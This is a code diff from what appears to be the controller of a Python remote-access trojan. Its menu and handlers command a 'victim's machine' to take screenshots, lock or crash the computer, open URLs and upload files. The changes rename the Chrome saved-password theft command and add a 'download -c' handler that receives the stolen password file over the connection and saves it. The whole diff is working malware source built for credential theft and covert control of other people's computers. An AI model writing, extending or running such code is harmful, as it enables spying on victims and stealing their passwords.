@@ -123,8 +123,9 @@ def sendCommands(conn):
             print('screenshot               Take a screenshot of machine')
             print('download -s              Download screenshot to your computer')
             print("download -f [file]       Download a .txt file from victim's machine")
+            print("download -c              Download saved password chrome file")
             print("openurl [url]            Open a url page in the victim's machine")
-            print("chome -p                 Attempt to retrieve saved chrome passwords")
+            print("chrome                   Attempt to retrieve saved chrome passwords")
             print('memory                   Print phyiscal and virtual memory')
             print('crash                    Attempt to crash computer')
             print('lock                     Lock computer screen')
@@ -164,10 +165,6 @@ def sendCommands(conn):
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), "utf-8")
             print('\n' + clientResponse, end="")
-        elif cmd == 'chrome -p':
-            conn.send(str.encode(cmd))
-            clientResponse = str(conn.recv(1024), "utf-8")
-            print(clientResponse)
         elif cmd[:11] == 'download -f':
             try:
                 conn.send(str.encode(cmd))
@@ -213,7 +210,26 @@ def sendCommands(conn):
             img.save(imgname)
             print(GREEN + BOLD + '[*] Screenshot output in ' + END + CYAN + imgname + END)
             print('                     ')
-
+        elif cmd == 'chrome':
+            conn.send(str.encode(cmd))
+            print('')
+            print(GREEN + BOLD + "[*] Type 'download', let's see if this worked!")
+            print('')
+        elif cmd == 'download -c':
+            try:
+                conn.send(str.encode(cmd))
+                print('\n' + YELLOW + "[!] Please use this for 'txt' or other document file transfers. Use 'download -s' to transfer a taken screenshot. Type Q to quit." + END)
+                print(YELLOW + "[!] Recommended download size is no more than 3GBs! ")
+                filename = input('\n' + CYAN + '[*] Please enter a filename for the incoming file: ' + END + GREEN)
+                file = open(filename, 'wb')
+                file_data = conn.recv(1024)
+                print(GREEN + BOLD + '\n' + '[*] Downloading...' + END)
+                file.write(file_data)
+                file.close()
+                print(GREEN + BOLD + '[*] Downloaded successfully to ' + filename + END + '\n')
+            except:
+                print(RED + BOLD + '[!] There was an error downloading your file (Error is in server source code).' + END + '\n')
+                pass
 
 def main():
     signal.signal(signal.SIGINT, signal_handler)
